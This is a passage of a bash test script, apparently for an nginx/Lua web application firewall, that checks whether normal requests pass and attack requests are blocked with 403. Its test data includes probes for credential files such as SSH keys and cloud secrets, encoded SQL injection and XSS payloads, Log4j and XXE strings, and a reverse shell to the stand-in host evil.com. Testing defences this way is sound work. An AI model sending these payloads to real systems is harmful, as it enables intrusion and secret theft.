test_rule "Normal: token" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?token=abc123def456"
test_rule "Normal: UTF-8 chars" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/?name=%E4%BD%A0%E5%A5%BD"
test_rule "Normal: Mobile UA" 200 -A "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)" "$TARGET/"
test_rule "Normal: Chrome UA" 200 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0" "$TARGET/"
test_rule "Normal: curl UA" 200 -A "curl/7.68.0" "$TARGET/"

# ============================================================
# 23. URL 路径补充覆盖
# ============================================================
echo -e "\n${CYAN}=== 23. URL 路径补充覆盖 ===${NC}" | tee -a $RESULTS
for path in \
    /.env.local /.env.production /.env.bak /.env.dev /.env.staging \
    /.env.example /.env.development /.env.testing \
    /.env.production.local /.env.development.local /.env.test.local \
    /vendor/autoload.php /server.php /artisan \
    /storage/ /node_modules/ /coverage/ \
    /debug/pprof/ /debug/vars /debug/requests /debug/events \
    /metrics /healthz /readyz /livez \
    /_debug /_profiler /_profiler/php /_ignition /_ignition/health-check \
    /telescope /telescope/requests /horizon /horizon/dashboard \
    /logviewer /logviewer/api /altair /playground \
    /saml /saml/login /saml/logout /saml/metadata \
    /federationmetadata /adfs/ls /ntlm /negotiate /kerberos \
    /.aws/credentials /.aws/config /.aws/credentials.json \
    /.gcloud/credentials /.gcloud/application_default_credentials.json \
    /.azure /.azure/azureApp.json \
    /.ssh/id_rsa /.ssh/id_ecdsa /.ssh/id_ed25519 /.ssh/id_dsa \
    /.ssh/authorized_keys /.ssh/known_hosts \
    /.gnupg /.gnupg/private-keys /.pki /.pki/nssdb \
    /.kube/config /.docker/config.json \
    /.npmrc /.pypirc /.gem/credentials /.gemrc /.netrc \
    /.gitconfig /.git-credentials /.gitlab-ci.yml /.travis.yml \
    /codecov.yml /.circleci /bitbucket-pipelines.yml /Jenkinsfile \
    /.drone.yml /azure-pipelines.yml /.editorconfig /.eslintrc \
    /tsconfig.json /webpack.config.js /babel.config.js /.babelrc \
    /vue.config.js /nuxt.config.js /next.config.js /angular.json \
    /Gopkg.lock /go.mod /go.sum /Cargo.toml /Cargo.lock \
    /build.sbt /build.properties /Makefile /CMakeLists.txt \
    /config.status /libtool /.ftpquota /.dockerenv /.dockerinit \
    /daemon.json /containerd.json /crictl.yaml /kubelet.config \
    /nginx.conf /httpd.conf /my.cnf /wp-config.php \
    /settings.php /database.yml /master.yml /pom.xml /build.gradle \
    /Gemfile /Gemfile.lock /composer.lock \
    /web.config /appsettings.json /appsettings.Development.json \
    /appsettings.Production.json /connectionstrings.json /secrets.json \
    /app.secret /.secret /secret.key \
    /admin.php /admin.jsp /admin.asp /admin.aspx \
    /crossdomain.xml /web.xml /WEB-INF/web.xml /META-INF/MANIFEST.MF \
    /wp-config /wp-content/backup /wp-load.php /wp-blog-header.php \
    /wp-mail.php /wp-cron.php /wp-signup.php /wp-activate.php \
    /install.php /install.sh /setup.php /setup.sh \
    /phpinfo /info.php /test.php /debug.php \
    /p.hp /phtml /php3 /php4 /php5 /php7 /php8 /pht /phar /shtml \
    /htaccess /htpasswd \
    /_vti_bin/ /_vti_log/ /CVS/ /.bzr/ /.hg/ \
    /.DS_Store /server-info /scripts/ \
    /elfinder/ /ueditor/ /kindeditor/ /ewebeditor/ /fckeditor/ \
    /struts/ /.svn/entries /.svn/wc.db \
    /readyz /livez; do
    test_rule "Path $path" 403 -H "User-Agent: Mozilla/5.0" "${TARGET}${path}"
done

# ============================================================
# 24. Cookie 编码绕过
# ============================================================
echo -e "\n${CYAN}=== 24. Cookie 编码绕过 ===${NC}" | tee -a $RESULTS
test_rule "Cookie double-encode SQL" 403 -H "User-Agent: Mozilla/5.0" -b "id=%2575nion+%2573elect+1" "$TARGET/"
test_rule "Cookie JS unicode XSS" 403 -H "User-Agent: Mozilla/5.0" -b 'q=\u003cscript\u003ealert(1)\u003c/script\u003e' "$TARGET/"
test_rule "Cookie JS hex XSS" 403 -H "User-Agent: Mozilla/5.0" -b 'q=\x3cscript\x3ealert(1)\x3c/script\x3e' "$TARGET/"
test_rule "Cookie HTML entity XSS" 403 -H "User-Agent: Mozilla/5.0" -b 'q=&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;' "$TARGET/"
test_rule "Cookie Log4j" 403 -H "User-Agent: Mozilla/5.0" -b 'q=${jndi:ldap://evil.com}' "$TARGET/"
test_rule "Cookie SSTI" 403 -H "User-Agent: Mozilla/5.0" -b 'q={{__class__}}' "$TARGET/"

# ============================================================
# 25. POST 编码绕过
# ============================================================
echo -e "\n${CYAN}=== 25. POST 编码绕过 ===${NC}" | tee -a $RESULTS
test_rule "POST double-encode SQL" 403 -H "User-Agent: Mozilla/5.0" -d "id=%2575nion+%2573elect+1" "$TARGET/"
test_rule "POST JS unicode XSS" 403 -H "User-Agent: Mozilla/5.0" -d 'q=\u003cscript\u003ealert(1)\u003c/script\u003e' "$TARGET/"
test_rule "POST JS hex XSS" 403 -H "User-Agent: Mozilla/5.0" -d 'q=\x3cscript\x3ealert(1)\x3c/script\x3e' "$TARGET/"
test_rule "POST HTML entity XSS" 403 -H "User-Agent: Mozilla/5.0" -d 'q=&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;' "$TARGET/"
test_rule "POST Log4j" 403 -H "User-Agent: Mozilla/5.0" -d 'q=${jndi:ldap://evil.com}' "$TARGET/"
test_rule "POST reverse shell" 403 -H "User-Agent: Mozilla/5.0" -d "cmd=bash+-i+>%26+/dev/tcp/evil.com/443+0>%261" "$TARGET/"
test_rule "POST XXE" 403 -H "User-Agent: Mozilla/5.0" -d 'q=<!ENTITY xxe SYSTEM "file:///etc/passwd">' "$TARGET/"

# ============================================================
# 后处理: 恢复配置
# ============================================================
echo -e "\n${CYAN}=== 后处理: 恢复配置 ===${NC}" | tee -a $RESULTS
set_config "cc_check" "on"
set_config "cc_rate" "150/60"
set_config "cc_block_ttl" "600"
set_config "referer_check" "off"
$SSH180 "echo '' > /opt/nginx/lua/waf/rule-config/blackip.rule 2>/dev/null"
restart_nginx
log "配置已恢复, nginx 已重启"

# 汇总
echo "" | tee -a $RESULTS
echo "========================================" | tee -a $RESULTS
echo "  全功能覆盖测试汇总" | tee -a $RESULTS
echo "  PASS: $PASS  FAIL: $FAIL  TOTAL: $TOTAL" | tee -a $RESULTS
echo "  时间: $(date)" | tee -a $RESULTS
echo "========================================" | tee -a $RESULTS
if [ $FAIL -gt 0 ]; then
    echo -e "失败项:$ERRORS" | tee -a $RESULTS
fi
echo ""
echo "Results saved to $RESULTS"